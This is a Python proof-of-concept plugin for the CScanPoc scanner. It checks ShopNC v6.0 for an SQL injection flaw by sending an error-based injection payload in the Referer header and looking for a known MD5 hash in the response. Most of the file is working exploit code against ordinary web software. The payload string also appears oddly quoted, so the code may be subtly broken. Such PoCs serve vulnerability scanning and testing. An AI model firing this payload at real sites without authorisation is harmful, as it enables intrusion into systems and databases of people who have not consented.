# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'ShopNC_0001'  # 平台漏洞编号，留空
    name = 'ShopNC v6.0 /index.php SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-01-31'  # 漏洞公布时间
    desc = '''
        ShopNC商城系统，是天津市网城天创科技有限责任公司开发的一套多店模式的商城系统。
        ShopNC v6.0 /index.php文件存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1218/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ShopNC'  # 漏洞应用名称
    product_version = 'v6.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '0efeb3f5-d514-4d7d-b259-7e32bae0c70d'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            header = {
                'Referer': ''' ("http://baidu.com'and(select 1 from(select count(*),concat("
                               "floor(rand(0)*2),0x3a,(select(select(SELECT md5(233333)))"
                               "from information_schema.tables limit 0,1))x from information_schema"
                               ".tables group by x)a) and 1=1)#")
                            '''
            }
            req = urllib.request.Request(self.target, headers=header)
            content = urllib.request.urlopen(req).read()

            if 'fb0b32aeafac4591c7ae6d5e58308344' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
